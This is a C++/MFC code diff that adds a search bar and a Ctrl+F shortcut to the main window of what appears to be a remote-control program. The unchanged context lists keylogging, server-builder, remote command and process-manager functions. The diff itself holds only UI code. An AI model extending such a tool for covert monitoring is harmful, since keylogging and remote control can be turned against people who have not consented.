@@ -48,6 +48,7 @@
 #include <thread>
 #include "common/file_upload.h"
 #include "SplashDlg.h"
+#include "SearchBarDlg.h"
 #include <ServerServiceWrapper.h>
 #include "CDlgFileSend.h"
 #include "CClientListDlg.h"
@@ -500,6 +501,10 @@ CMy2015RemoteDlg::~CMy2015RemoteDlg()
         m_FileServer->Stop();
         SAFE_DELETE(m_FileServer);
     }
+    if (m_pSearchBar) {
+        m_pSearchBar->DestroyWindow();
+        SAFE_DELETE(m_pSearchBar);
+    }
 }
 
 // DLL 请求限流成员函数实现
@@ -550,6 +555,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_COMMAND(ID_ONLINE_UPDATE, &CMy2015RemoteDlg::OnOnlineUpdate)
     ON_COMMAND(IDM_ONLINE_ABOUT, &CMy2015RemoteDlg::OnAbout)
     ON_COMMAND(ID_HELP, &CMy2015RemoteDlg::OnAbout)
+    ON_COMMAND(ID_TOOLBAR_SEARCH, &CMy2015RemoteDlg::OnToolbarSearch)
 
     ON_COMMAND(IDM_ONLINE_CMD, &CMy2015RemoteDlg::OnOnlineCmdManager)
     ON_COMMAND(IDM_ONLINE_PROCESS, &CMy2015RemoteDlg::OnOnlineProcessManager)
@@ -784,7 +790,8 @@ VOID CMy2015RemoteDlg::CreateToolBar()
     m_ToolBar.SetButtonText(9, _TR("键盘记录"));
     m_ToolBar.SetButtonText(10, _TR("参数设置"));
     m_ToolBar.SetButtonText(11, _TR("生成服务端"));
-    m_ToolBar.SetButtonText(12, _TR("帮助"));
+    m_ToolBar.SetButtonText(12, _TR("搜索"));
+    m_ToolBar.SetButtonText(13, _TR("帮助"));
     RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //显示
 }
 
@@ -1851,6 +1858,10 @@ void CMy2015RemoteDlg::OnExitSizeMove()
     if (m_CList_Message.m_hWnd != NULL) {
         m_CList_Message.RedrawWindow(NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN | RDW_UPDATENOW);
     }
+    // 更新搜索栏位置（跟随主窗口移动/调整大小）
+    if (m_pSearchBar && m_pSearchBar->GetSafeHwnd() && m_pSearchBar->IsWindowVisible()) {
+        m_pSearchBar->UpdatePosition();
+    }
 }
 
 LRESULT CMy2015RemoteDlg::OnPasswordCheck(WPARAM wParam, LPARAM lParam)
@@ -2045,6 +2056,9 @@ void CMy2015RemoteDlg::OnClose()
 {
     // 隐藏窗口而不是关闭
     ShowWindow(SW_HIDE);
+	if (m_pSearchBar && m_pSearchBar->GetSafeHwnd()) {
+        m_pSearchBar->ShowWindow(SW_HIDE);
+    }
     Mprintf("======> Hide\n");
 }
 
@@ -2732,6 +2746,19 @@ VOID CMy2015RemoteDlg::OnAbout()
 {
     MessageBoxL("Copyleft (c) FTU 2019-2026" + CString(" v") + VERSION_STR + _L("\n编译日期: ") + __DATE__ +
                 CString(sizeof(void*)==8 ? " (x64)" : " (x86)"), "关于", MB_ICONINFORMATION);
+}
+
+// 工具栏搜索按钮
+void CMy2015RemoteDlg::OnToolbarSearch()
+{
+    if (!m_pSearchBar) {
+        m_pSearchBar = new CSearchBarDlg(this);
+    }
+    if (m_pSearchBar->GetSafeHwnd() && m_pSearchBar->IsWindowVisible()) {
+        m_pSearchBar->Hide();
+    } else {
+        m_pSearchBar->Show();
+    }
 }
 
 //托盘Menu
@@ -4604,6 +4631,16 @@ BOOL CMy2015RemoteDlg::OnHelpInfo(HELPINFO* pHelpInfo)
 BOOL CMy2015RemoteDlg::PreTranslateMessage(MSG* pMsg)
 {
     if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_RETURN) {
+        return TRUE;
+    }
+
+    // Ctrl+F 显示搜索栏
+    if (pMsg->message == WM_KEYDOWN && pMsg->wParam == 'F' &&
+        (GetKeyState(VK_CONTROL) & 0x8000)) {
+        if (!m_pSearchBar) {
+            m_pSearchBar = new CSearchBarDlg(this);
+        }
+        m_pSearchBar->Show();
         return TRUE;
     }
 
